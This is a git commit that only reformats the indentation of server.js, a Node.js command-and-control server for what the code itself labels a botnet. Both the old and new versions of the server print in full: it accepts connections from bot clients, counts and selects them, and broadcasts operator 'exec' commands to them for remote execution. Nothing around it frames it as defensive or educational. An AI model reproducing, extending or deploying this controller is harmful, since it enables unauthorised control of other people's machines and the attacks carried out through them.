4ab014bf0dda873aa3d1e1e61209b2b5623f86ed
Boody <bodebi639@gmail.com>
2023-07-20 18:34:26 +0300

    Formatted files

--- server/server.js
+++ server/server.js
@@ -2,8 +2,8 @@ const net = require("net");
 require("dotenv").config({ path: "../config/.env" });
 
 const readline = require("readline").createInterface({
-  input: process.stdin,
-  output: process.stdout,
+	input: process.stdin,
+	output: process.stdout,
 });
 
 // Keep track of all clients
@@ -15,78 +15,78 @@ const PORT = process.env.PORT;
 const HOST = process.env.HOST;
 
 function setTerminalTitle() {
-  process.stdout.write(
-    String.fromCharCode(27) +
-      "]0;" +
-      `Botnet | Bots: ${clientCount}` +
-      String.fromCharCode(7)
-  );
+	process.stdout.write(
+		String.fromCharCode(27) +
+			"]0;" +
+			`Botnet | Bots: ${clientCount}` +
+			String.fromCharCode(7)
+	);
 }
 setTerminalTitle();
 
 net
-  .createServer((socket) => {
-    // Identify client
-    socket.name = `${socket.remoteAddress}:${socket.remotePort}`;
+	.createServer((socket) => {
+		// Identify client
+		socket.name = `${socket.remoteAddress}:${socket.remotePort}`;
 
-    // On client connect
-    clients.push(socket);
+		// On client connect
+		clients.push(socket);
 
-    clientCount++;
-    clientInstances = [...clients];
-    console.log(`Client ${socket.name} has connected.\n`);
+		clientCount++;
+		clientInstances = [...clients];
+		console.log(`Client ${socket.name} has connected.\n`);
 
-    setTerminalTitle();
-    prompt();
+		setTerminalTitle();
+		prompt();
 
-    function prompt() {
-      readline.question("[BOTNET] ", (msg) => {
-        msg = msg.toLowerCase();
+		function prompt() {
+			readline.question("[BOTNET] ", (msg) => {
+				msg = msg.toLowerCase();
 
-        if (msg === "instances") {
-          console.log(`Instances: ${clientInstances.length}`);
-        }
+				if (msg === "instances") {
+					console.log(`Instances: ${clientInstances.length}`);
+				}
 
-        if (msg.startsWith("instances")) {
-          if (msg.split(" ")[1] <= clients.length) {
-            clientInstances = [...clients];
-            clientInstances = clientInstances.slice(0, msg.split(" ")[1]);
-          }
-        }
+				if (msg.startsWith("instances")) {
+					if (msg.split(" ")[1] <= clients.length) {
+						clientInstances = [...clients];
+						clientInstances = clientInstances.slice(0, msg.split(" ")[1]);
+					}
+				}
 
-        if (msg.split(" ")[1] === "all") clientInstances = [...clients];
+				if (msg.split(" ")[1] === "all") clientInstances = [...clients];
 
-        if (msg.startsWith("exec")) broadcast(msg);
-        return prompt();
-      });
-    }
+				if (msg.startsWith("exec")) broadcast(msg);
+				return prompt();
+			});
+		}
 
-    function broadcast(message) {
-      clientInstances.forEach((client) => {
-        client.write(message);
-      });
-      process.stdout.write("\n" + message);
-    }
+		function broadcast(message) {
+			clientInstances.forEach((client) => {
+				client.write(message);
+			});
+			process.stdout.write("\n" + message);
+		}
 
-    function clientDisconnected() {
-      clients.splice(clients.indexOf(socket), 1);
-      clientCount--;
-      clientInstances = [...clients];
-      console.log(`Client ${socket.name} has disconnected.\n`);
-      if (clientCount < 1) console.log("Waiting for clients to connect.\n");
-      setTerminalTitle();
-    }
+		function clientDisconnected() {
+			clients.splice(clients.indexOf(socket), 1);
+			clientCount--;
+			clientInstances = [...clients];
+			console.log(`Client ${socket.name} has disconnected.\n`);
+			if (clientCount < 1) console.log("Waiting for clients to connect.\n");
+			setTerminalTitle();
+		}
 
-    socket.on("data", (data) => {
-      broadcast(`[CLIENT ${socket.name}] ` + data, socket);
-      prompt();
-    });
+		socket.on("data", (data) => {
+			broadcast(`[CLIENT ${socket.name}] ` + data, socket);
+			prompt();
+		});
 
-    socket.on("error" || "end", () => {
-      clientDisconnected();
-    });
-  })
-  .listen(PORT, HOST);
+		socket.on("error" || "end", () => {
+			clientDisconnected();
+		});
+	})
+	.listen(PORT, HOST);
 
 console.log(`Server running on ${HOST}:${PORT}.`);
 console.log(`Waiting for connections.\n`);
